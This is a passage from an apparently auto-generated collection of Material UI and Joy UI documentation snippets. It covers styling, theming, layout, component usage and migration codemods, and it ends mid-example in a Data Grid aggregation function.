needs to target a specific class and applies padding universally. The setup reduces the complexity required for custom styling, relying on the styled function and React components. The App component integrates the custom toolbar using the components prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v5.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\nconst GridToolbarContainerStyled = styled(GridToolbarContainer)({\n  padding: 40,\n});\n\nfunction MyCustomToolbar() {\n  return (\n    <GridToolbarContainerStyled>\n      My custom toolbar\n    </GridToolbarContainer>\n  );\n};\n\nexport default function App() {\n  return (\n    <div style={{ height: 400, width: '100%' }}>\n      <DataGrid components={{ Toolbar: MyCustomToolbar }} />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Responsive Grid with Breakpoint-Based Values\nDESCRIPTION: Grid example showing how to switch prop values based on active breakpoints for responsive layouts.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"ResponsiveGrid.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Customized Menus\nDESCRIPTION: Example of menu component customization with custom styles and behavior.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_7\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"CustomizedMenus.js\"}\n```\n\n----------------------------------------\n\nTITLE: Customizing Slider Steps in React\nDESCRIPTION: Shows how to adjust the default step increment and shift step for a discrete slider in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_3\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"DiscreteSliderSteps.js\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring Autocomplete Options\nDESCRIPTION: Example showing how to structure options for the Autocomplete component using either objects with label and id properties or simple string arrays.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/autocomplete/autocomplete.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst options = [\n  { label: 'The Godfather', id: 1 },\n  { label: 'Pulp Fiction', id: 2 },\n];\n// or\nconst options = ['The Godfather', 'Pulp Fiction'];\n```\n\n----------------------------------------\n\nTITLE: Vertical ButtonGroup Orientation\nDESCRIPTION: Shows how to create a vertical button group using the orientation prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/button-group/button-group.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<ButtonGroup orientation=\"vertical\" aria-label=\"vertical button group\">\n  <Button>Button 1</Button>\n  <Button>Button 2</Button>\n  <Button>Button 3</Button>\n</ButtonGroup>\n```\n\n----------------------------------------\n\nTITLE: Implementing Scroll Trigger for App Bar\nDESCRIPTION: Example of using the useScrollTrigger hook to create responsive behavior based on scroll position.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/app-bar/app-bar.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nimport useScrollTrigger from '@mui/material/useScrollTrigger';\n\nfunction HideOnScroll(props) {\n  const trigger = useScrollTrigger();\n  return (\n    <Slide in={!trigger}>\n      <div>Hello</div>\n    </Slide>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Styling Nested Components via MUI Styled API in JSX\nDESCRIPTION: Demonstrates how to use styled components as selectors when styling parent and child elements using @emotion/styled. The snippet shows how a parent styled component can target a child styled component via selector interpolation, causing nested children to have different styles than those outside the parent. Requires @emotion/styled as a dependency. Expects React environment with rendering capabilities.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/styled/styled.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\nimport styled from '@emotion/styled';\\n\\nconst Child = styled.div`\\n  color: red;\\n`;\\n\\nconst Parent = styled.div`\\n  ${Child} {\\n    color: green;\\n  }\\n`;\\n\\nrender(\\n  <div>\\n    <Parent>\\n      <Child>Green because I am inside a Parent</Child>\\n    </Parent>\\n    <Child>Red because I am not inside a Parent</Child>\\n  </div>,\\n);\n```\n\n----------------------------------------\n\nTITLE: Implementing Vertical Slider in React\nDESCRIPTION: Demonstrates how to create a vertical slider by setting the 'orientation' prop to 'vertical' in Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_13\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"VerticalSlider.js\"}\n```\n\n----------------------------------------\n\nTITLE: Updating Lab Component Imports\nDESCRIPTION: Demonstrates how to update imports for components that have moved from @mui/lab to @mui/material, such as Alert, Autocomplete, and others.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_24\n\nLANGUAGE: diff\nCODE:\n```\n-import Alert from '@mui/lab/Alert';\n+import Alert from '@mui/material/Alert';\n\n-import { Alert } from '@mui/lab';\n+import { Alert } from '@mui/material';\n```\n\n----------------------------------------\n\nTITLE: Running the preset-safe codemod for Material-UI v5 migration\nDESCRIPTION: This command runs the preset-safe codemod which contains most of the transformers necessary for migration from Material-UI v4 to v5. It should only be applied once per folder.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/migration-v4.md#2025-04-22_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/preset-safe <path>\n```\n\n----------------------------------------\n\nTITLE: Clickable Chip Implementation\nDESCRIPTION: Example of clickable chips with onClick handlers and different variants.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/chips/chips.md#2025-04-22_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport * as React from 'react';\nimport Chip from '@mui/material/Chip';\nimport Stack from '@mui/material/Stack';\n\nexport default function ClickableChips() {\n  const handleClick = () => {\n    console.info('You clicked the Chip.');\n  };\n\n  return (\n    <Stack direction=\"row\" spacing={1}>\n      <Chip label=\"Clickable\" onClick={handleClick} />\n      <Chip label=\"Clickable\" variant=\"outlined\" onClick={handleClick} />\n    </Stack>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Customizing Material UI Breakpoint Values\nDESCRIPTION: Example of customizing default breakpoint values in Material UI theme configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/breakpoints/breakpoints.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nconst theme = createTheme({\n  breakpoints: {\n    values: {\n      xs: 0,\n      sm: 600,\n      md: 900,\n      lg: 1200,\n      xl: 1536,\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Styling Pseudo-states in Material UI Components\nDESCRIPTION: Example of styling pseudo-states of Material UI components using the classes prop, demonstrating how to override default styles for specific states.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_22\n\nLANGUAGE: TypeScript\nCODE:\n```\nimport * as React from 'react';\nimport Slider from '@mui/material/Slider';\n\nexport default function SliderThumbOverrides() {\n  return <Slider defaultValue={30} classes={{ active: 'shadow-none' }} />;\n}\n```\n\n----------------------------------------\n\nTITLE: Rendered HTML Input Structure\nDESCRIPTION: The resulting HTML structure when rendering a Text Field with custom input attributes\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/text-fields/text-fields.md#2025-04-22_snippet_1\n\nLANGUAGE: HTML\nCODE:\n```\n<input\n  aria-invalid=\"false\"\n  class=\"MuiInputBase-input MuiOutlinedInput-input\"\n  type=\"text\"\n  data-testid=\"…\"\n/>\n```\n\n----------------------------------------\n\nTITLE: Creating Custom SVG Icons with createSvgIcon\nDESCRIPTION: Using the createSvgIcon utility to create custom SVG icons that can be used as Material UI components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/icons/icons.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nconst HomeIcon = createSvgIcon(\n  <path d=\"M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z\" />,\n  'Home',\n);\n\n// or with custom SVG\nconst PlusIcon = createSvgIcon(\n  <svg\n    xmlns=\"http://www.w3.org/2000/svg\"\n    fill=\"none\"\n    viewBox=\"0 0 24 24\"\n    strokeWidth={1.5}\n    stroke=\"currentColor\"\n    className=\"h-6 w-6\"\n  >\n    <path strokeLinecap=\"round\" strokeLinejoin=\"round\" d=\"M12 4.5v15m7.5-7.5h-15\" />\n  </svg>,\n  'Plus',\n);\n```\n\n----------------------------------------\n\nTITLE: ButtonGroup with Different Variants\nDESCRIPTION: Shows how to implement ButtonGroup with different variants like contained, outlined, and text.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/button-group/button-group.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<ButtonGroup variant=\"outlined\" aria-label=\"outlined button group\">\n  <Button>One</Button>\n  <Button>Two</Button>\n  <Button>Three</Button>\n</ButtonGroup>\n```\n\n----------------------------------------\n\nTITLE: Implementing Nested Typography Components in Joy UI\nDESCRIPTION: Demonstrates how Typography components automatically adjust their HTML tag rendering based on nesting. Parent Typography renders as a <p> tag while nested Typography renders as a <span> tag for semantic correctness.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/main-features/automatic-adjustment/automatic-adjustment.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n<Typography> // the parent Typography renders as a <p>\n  This is a very\n    <Typography fontWeight=\"lg\">important</Typography> // the child renders as a <span>\n  message.\n</Typography>\n```\n\n----------------------------------------\n\nTITLE: Configuring Tailwind CSS for Material UI Integration\nDESCRIPTION: Modifications to the Tailwind CSS configuration file to disable preflight and set the 'important' option for compatibility with Material UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_16\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  corePlugins: {\n    preflight: false,\n  },\n  important: '#root',\n  content: [\n    \"./src/**/*.{js,jsx,ts,tsx}\",\n  ],\n  theme: {\n    extend: {},\n  },\n  plugins: [],\n}\n```\n\n----------------------------------------\n\nTITLE: Exclusive Selection with Toggle Button Group in React\nDESCRIPTION: This example demonstrates how to use the Toggle Button Group component in exclusive selection mode. When the value provided is not an array, only one button can be selected at a time.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/toggle-button-group/toggle-button-group.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<ToggleButtonGroup spacing={{ xs: 0, md: 2, lg: 3 }}>…</ToggleButtonGroup>\n```\n\n----------------------------------------\n\nTITLE: Styling Button Padding Using styled and sx in MUI - JavaScript\nDESCRIPTION: Compares the difference in padding meaning between styled and the sx prop. Using styled, 'padding: 1' means '1px', while in the sx prop, 'padding: 1' resolves to 'theme.spacing(1)'. Both examples are self-contained and require @mui/material or @mui/system, and showcase how developer intent is expressed differently.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/styled/styled.md#2025-04-22_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nconst MyStyledButton = styled('button')({\n  padding: 1, // means \"1px\", NOT \"theme.spacing(1)\"\n});\n```\n\nLANGUAGE: javascript\nCODE:\n```\nimport Button from '@mui/material/Button';\n\nconst MyStyledButton = (props) => (\n  <Button\n    sx={{\n      padding: 1, // means \"theme.spacing(1)\", NOT \"1px\"\n    }}\n  >\n    {props.children}\n  </Button>\n);\n```\n\n----------------------------------------\n\nTITLE: Configuring MUI Theme with Localization for Date Pickers in React\nDESCRIPTION: This snippet demonstrates how to set up a MUI theme with localization support for date pickers, data grid, and core components. It imports necessary modules and creates a theme with Bulgarian translations.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/date-pickers-stable-v5.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { createTheme, ThemeProvider } from '@mui/material/styles';\nimport { DataGrid, bgBG as dataGridBgBG } from '@mui/x-data-grid';\nimport { bgBG as coreBgBG } from '@mui/material/locale';\nimport bgLocale from 'date-fns/locale/bg';\nimport { CalendarPicker, LocalizationProvider, bgBG } from '@mui/x-date-pickers';\nimport { AdapterDayjs } from '@mui/x-date-pickers/AdapterDayjs';\n\nconst theme = createTheme(\n  {\n    palette: {\n      primary: { main: '#1976d2' },\n    },\n  },\n  bgBG, // x-date-pickers translations\n  dataGridBgBG, // x-data-grid translations\n  coreBgBG, // core translations\n);\n```\n\n----------------------------------------\n\nTITLE: Creating Form Input Fields\nDESCRIPTION: Implements form control components with email and password input fields using Joy UI's Form components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/getting-started/tutorial/tutorial.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<FormControl>\n  <FormLabel>Email</FormLabel>\n  <Input\n    // html input attribute\n    name=\"email\"\n    type=\"email\"\n    placeholder=\"johndoe@email.com\"\n  />\n</FormControl>\n<FormControl>\n  <FormLabel>Password</FormLabel>\n  <Input\n    name=\"password\"\n    type=\"password\"\n    placeholder=\"password\"\n  />\n</FormControl>\n```\n\n----------------------------------------\n\nTITLE: Implementing Fade Transition with React Component\nDESCRIPTION: Example showing how to properly implement a Fade transition component with ref forwarding and style prop handling. Demonstrates the correct way to structure a child component for Material-UI transitions.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/transitions/transitions.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n// The `props` object contains a `style` prop.\n// You need to provide it to the `div` element as shown here.\nconst MyComponent = React.forwardRef(function (props, ref) {\n  return (\n    <div ref={ref} {...props}>\n      Fade\n    </div>\n  );\n});\n\nexport default function Main() {\n  return (\n    <Fade>\n      {/* MyComponent must be the only child */}\n      <MyComponent />\n    </Fade>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Grid Area Names\nDESCRIPTION: Example of naming grid areas for use with grid-template-areas property.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/grid/grid.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ gridArea: 'header' }}>…\n```\n\n----------------------------------------\n\nTITLE: Type Casting with styled() in Material UI\nDESCRIPTION: Example of using the styled() utility with TypeScript in Material UI projects. The component is cast back to its original type to maintain proper typing when using custom styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/typescript/typescript.md#2025-04-22_snippet_1\n\nLANGUAGE: tsx\nCODE:\n```\nimport Button from '@mui/material/Button';\nimport { styled } from '@mui/material/styles';\n\nconst CustomButton = styled(Button)({\n  // your custom styles go here\n}) as typeof Button;\n```\n\n----------------------------------------\n\nTITLE: Adding Custom Shadows to Joy UI Theme\nDESCRIPTION: Demonstrates how to add new custom shadow keys to the Joy UI theme. This allows for creating custom shadow values beyond the default T-shirt sizes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-shadow/theme-shadow.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nimport { extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({\n  shadow: {\n    subtle: '{CSS box-shadow}',\n    strong: '{CSS box-shadow}',\n  },\n});\n\n// Then, pass it to `<CssVarsProvider theme={theme}>`.\n```\n\n----------------------------------------\n\nTITLE: Importing Accordion Components in React\nDESCRIPTION: Basic imports for the core Accordion components from Material UI library.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/accordion/accordion.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Accordion from '@mui/material/Accordion';\nimport AccordionDetails from '@mui/material/AccordionDetails';\nimport AccordionSummary from '@mui/material/AccordionSummary';\n```\n\n----------------------------------------\n\nTITLE: Adding Module Augmentation for DefaultTheme in TypeScript\nDESCRIPTION: TypeScript code to add module augmentation for DefaultTheme when using @mui/styles with @mui/material.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_21\n\nLANGUAGE: typescript\nCODE:\n```\n// in the file where you are creating the theme (invoking the function `createTheme()`)\nimport { Theme } from '@mui/material/styles';\n\ndeclare module '@mui/styles' {\n  interface DefaultTheme extends Theme {}\n}\n```\n\n----------------------------------------\n\nTITLE: Grouping Avatars in React\nDESCRIPTION: Shows how to use the AvatarGroup component to render avatars as a stack, with the ability to limit the number of visible avatars using the 'max' prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/avatars/avatars.md#2025-04-22_snippet_7\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"GroupAvatars.js\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring App Layout for Material UI with Next.js App Router\nDESCRIPTION: Diff showing how to modify the app/layout.tsx file to integrate AppRouterCacheProvider for Material UI with Next.js App Router.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_3\n\nLANGUAGE: diff\nCODE:\n```\n+import { AppRouterCacheProvider } from '@mui/material-nextjs/v15-appRouter';\n // or `v1X-appRouter` if you are using Next.js v1X\n\n export default function RootLayout(props) {\n   return (\n     <html lang=\"en\">\n       <body>\n+        <AppRouterCacheProvider>\n           {props.children}\n+        </AppRouterCacheProvider>\n       </body>\n     </html>\n   );\n }\n```\n\n----------------------------------------\n\nTITLE: Creating Styled Components\nDESCRIPTION: Example of creating a styled component with basic styling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/experimental-api/pigment-css/pigment-css.md#2025-04-22_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nimport { styled } from '@pigment-css/react';\n\nconst Heading = styled('div')({\n  fontSize: '2rem',\n  color: '#9FADBC',\n  fontWeight: 'bold',\n  margin: '1rem',\n});\n```\n\n----------------------------------------\n\nTITLE: Creating a Styled Button Using CSS Variables\nDESCRIPTION: Demonstrates how to create a styled button component that uses the CSS variables from the theme. The button's styling adapts automatically to light or dark mode.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/experimental-api/css-theme-variables/css-theme-variables.md#2025-04-22_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n// Button.js\nimport { styled } from '@mui/system';\n\nconst Button = styled('button')(({ theme }) => ({\n  backgroundColor: theme.vars.palette.primary.default,\n  border: `1px solid ${theme.vars.palette.primary.dark}`,\n  color: theme.vars.palette.text.default,\n}));\n\nexport default Button;\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Filter with Start Match\nDESCRIPTION: Example of implementing a custom filter that matches options from the start of the string, using the filterOptions configuration with custom stringify function.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/autocomplete/autocomplete.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nconst filterOptions = createFilterOptions({\n  matchFrom: 'start',\n  stringify: (option) => option.title,\n});\n\n<Autocomplete filterOptions={filterOptions} />;\n```\n\n----------------------------------------\n\nTITLE: Accessible Accordion Implementation\nDESCRIPTION: Example showing proper accessibility attributes for Accordion components following WAI-ARIA guidelines.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/accordion/accordion.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\n<Accordion>\n  <AccordionSummary id=\"panel-header\" aria-controls=\"panel-content\">\n    Header\n  </AccordionSummary>\n  <AccordionDetails>\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n  </AccordionDetails>\n</Accordion>\n```\n\n----------------------------------------\n\nTITLE: Applying Grid Item Padding via Child Combinator (v1) in JavaScript\nDESCRIPTION: Illustrates the Grid v1 approach where the container component uses a CSS child combinator (`>`) and a helper function (`getOffset`) to apply padding directly to its immediate item children (`.${gridClasses.item}`). This method could complicate customization and is improved in v2.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/build-layouts-faster-with-grid-v2.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nfunction getOffset(val) {\n  const parse = parseFloat(val);\n  return `${parse}${String(val).replace(String(parse), '') || 'px'}`;\n}\n// ...The code is shorten for readability\n({\n  [`& > .${gridClasses.item}`]: {\n    // Grid item's padding is controlled by its container\n    paddingTop: getOffset(themeSpacing),\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Updating Default Props Provider in Next.js/Vite Config\nDESCRIPTION: This snippet shows how to move component default props from the theme configuration to a DefaultPropsProvider in the main application file.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_15\n\nLANGUAGE: diff\nCODE:\n```\nimport { createTheme } from '@mui/material';\n\nconst customTheme = createTheme({\n  // ...other tokens.\n  components: {\n    MuiButtonBase: {\n-      defaultProps: {\n-        disableRipple: true,\n-      },\n    },\n    MuiSelect: {\n-      defaultProps: {\n-        IconComponent: DropdownIcon,\n-      },\n    }\n  }\n});\n```\n\nLANGUAGE: diff\nCODE:\n```\n+ import DefaultPropsProvider from '@mui/material/DefaultPropsProvider';\n\n  function App() {\n    return (\n+     <DefaultPropsProvider value={{\n+       MuiButtonBase: {\n+         disableRipple: true,\n+       },\n+       MuiSelect: {\n+         IconComponent: DropdownIcon,\n+       },\n+     }}>\n        {/* Your app */}\n+     </DefaultPropsProvider>\n    );\n  }\n```\n\n----------------------------------------\n\nTITLE: Customizing Default Color Values - Joy UI Theme\nDESCRIPTION: Shows how to extend the theme to customize default color values for dark mode using the extendTheme function.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-colors/theme-colors.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport { extendTheme } from '@mui/joy/styles';\n\nconst theme = extendTheme({\n  colorSchemes: {\n    dark: {\n      palette: {\n        primary: {\n          50: '#C0CCD9',\n          100: '#A5B8CF',\n          200: '#6A96CA',\n          300: '#4886D0',\n          400: '#2178DD',\n          500: '#096BDE',\n          600: '#1B62B5',\n          700: '#265995',\n          800: '#2F4968',\n          900: '#2F3C4C',\n        },\n      },\n    },\n  },\n});\n\n// Then, pass it to `<CssVarsProvider theme={theme}>`.\n```\n\n----------------------------------------\n\nTITLE: TypeScript Implementation of Custom Material UI Component\nDESCRIPTION: This code demonstrates the TypeScript implementation of the custom Stat component in Material UI, including type-safe styling and prop handling.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/creating-themed-components/creating-themed-components.md#2025-04-22_snippet_5\n\nLANGUAGE: typescript\nCODE:\n```\nconst StatRoot = styled('div', {\n  name: 'MuiStat',\n  slot: 'root',\n})<{ ownerState: StatOwnerState }>(({ theme, ownerState }) => ({\n  display: 'flex',\n  flexDirection: 'column',\n  gap: theme.spacing(0.5),\n  padding: theme.spacing(3, 4),\n  backgroundColor: theme.palette.background.paper,\n  borderRadius: theme.shape.borderRadius,\n  boxShadow: theme.shadows[2],\n  letterSpacing: '-0.025em',\n  fontWeight: 600,\n  // typed-safe access to the `variant` prop\n  ...(ownerState.variant === 'outlined' && {\n    border: `2px solid ${theme.palette.divider}`,\n    boxShadow: 'none',\n  }),\n}));\n\n// …do the same for other slots\n\nconst Stat = React.forwardRef<HTMLDivElement, StatProps>(function Stat(inProps, ref) {\n  const props = useThemeProps({ props: inProps, name: 'MuiStat' });\n  const { value, unit, variant, ...other } = props;\n\n  const ownerState = { ...props, variant };\n\n  return (\n    <StatRoot ref={ref} ownerState={ownerState} {...other}>\n      <StatValue ownerState={ownerState}>{value}</StatValue>\n      <StatUnit ownerState={ownerState}>{unit}</StatUnit>\n    </StatRoot>\n  );\n});\n```\n\n----------------------------------------\n\nTITLE: Integrating Breadcrumbs with React Router\nDESCRIPTION: Demonstrates how to integrate the Breadcrumbs component with React Router for dynamic breadcrumb generation based on the current route.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_7\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"RouterBreadcrumbs.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Creating Letter Avatars in React\nDESCRIPTION: Shows how to create avatars containing simple characters by passing a string as 'children' to the Avatar component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/avatars/avatars.md#2025-04-22_snippet_1\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"LetterAvatars.js\"}\n```\n\n----------------------------------------\n\nTITLE: ButtonGroup with Custom Sizes and Colors\nDESCRIPTION: Illustrates how to use size and color props to customize the appearance of button groups.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/button-group/button-group.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<ButtonGroup size=\"large\" color=\"secondary\" aria-label=\"large secondary button group\">\n  <Button>One</Button>\n  <Button>Two</Button>\n  <Button>Three</Button>\n</ButtonGroup>\n```\n\n----------------------------------------\n\nTITLE: TypeScript Interface Augmentation for Custom Variants in Joy UI\nDESCRIPTION: Shows how to add type safety for custom variant values using TypeScript module augmentation, enabling proper type checking with custom variants.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/themed-components/themed-components.md#2025-04-22_snippet_13\n\nLANGUAGE: typescript\nCODE:\n```\n// This part could be declared in your theme file\ndeclare module '@mui/joy/Sheet' {\n  interface SheetPropsVariantOverrides {\n    glass: true;\n  }\n}\n\n// typed-safe\n<Sheet variant=\"glass\" />;\n```\n\n----------------------------------------\n\nTITLE: Implementing Avatar Fallbacks in React\nDESCRIPTION: Demonstrates the fallback behavior of the Avatar component when there's an error loading the avatar image.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/avatars/avatars.md#2025-04-22_snippet_6\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"FallbackAvatars.js\"}\n```\n\n----------------------------------------\n\nTITLE: Customizing Rating Component in React with Material-UI\nDESCRIPTION: Provides examples of customizing the Rating component. This snippet showcases various ways to override the default styling and behavior.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/rating/rating.md#2025-04-22_snippet_4\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"CustomizedRating.js\"}\n```\n\n----------------------------------------\n\nTITLE: Applying Z-Index in Material-UI with JSX\nDESCRIPTION: Demonstrates how to apply z-index values using Material-UI's Box component and the sx prop. The example shows setting z-index to predefined values like 'tooltip' and 'modal'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/positions/positions.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ zIndex: 'tooltip' }}>\n<Box sx={{ zIndex: 'modal' }}>\n```\n\n----------------------------------------\n\nTITLE: Migrating Color Mode Styles to theme.applyStyles in React\nDESCRIPTION: Example of updating component styles to use the new theme.applyStyles utility instead of checking theme.palette.mode for dark mode styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_24\n\nLANGUAGE: diff\nCODE:\n```\n const MyComponent = styled('button')(({ theme }) => ({\n   padding: '0.5rem 1rem',\n   border: '1px solid,\n-  borderColor: theme.palette.mode === 'dark' ? '#fff' : '#000',\n+  borderColor: '#000',\n+  ...theme.applyStyles('dark', {\n+    borderColor: '#fff',\n+  })\n }))\n```\n\n----------------------------------------\n\nTITLE: Automating MUI X Migration with Codemods (Bash)\nDESCRIPTION: This Bash code snippet executes the @mui/x-codemod package using NPX to automatically migrate a codebase to the MUI X 6.0.0 preset. The 'preset-safe' migration ensures compatibility with the latest breaking changes in v6, simplifying the upgrade process. Dependencies include Node.js, npx, and internet access; <path> should be replaced with the target source directory or file to transform.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v6.md#2025-04-22_snippet_4\n\nLANGUAGE: Bash\nCODE:\n```\nnpx @mui/x-codemod@latest v6.0.0/preset-safe <path>\n```\n\n----------------------------------------\n\nTITLE: Customizing Stepper Indicator in React\nDESCRIPTION: This snippet shows how to customize the Step component with a StepIndicator. It demonstrates the use of different variants for the indicator, which can be 'soft', 'solid', 'outlined', or 'plain'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/stepper/stepper.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Stepper>\n  <Step indicator={<StepIndicator variant=\"solid\">1</StepIndicator>}>\n    Select campaign settings\n  </Step>\n  <Step indicator={<StepIndicator>2</StepIndicator>}>\n    Create an ad group\n  </Step>\n  <Step indicator={<StepIndicator variant=\"outlined\">3</StepIndicator>}>\n    Create an ad\n  </Step>\n</Stepper>\n```\n\n----------------------------------------\n\nTITLE: Implementing Simple Bottom Navigation in React with Material-UI\nDESCRIPTION: This snippet demonstrates how to create a basic Bottom Navigation component with three actions, displaying both icons and text labels at all times.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/bottom-navigation/bottom-navigation.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n\"SimpleBottomNavigation.js\"\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Aggregation Function in MUI X Data Grid\nDESCRIPTION: Implements a custom aggregation function that returns the first value in alphabetical order from a column of string values. The function defines the aggregation logic, display label, and which column types it applies to.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/aggregation-functions.md#2025-04-22_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\nconst firstAlphabeticalAggregation: GridAggregationFunction<\n  string,\n  string | null\n> = {\n  apply: (params) => {\n    if (params.values.length 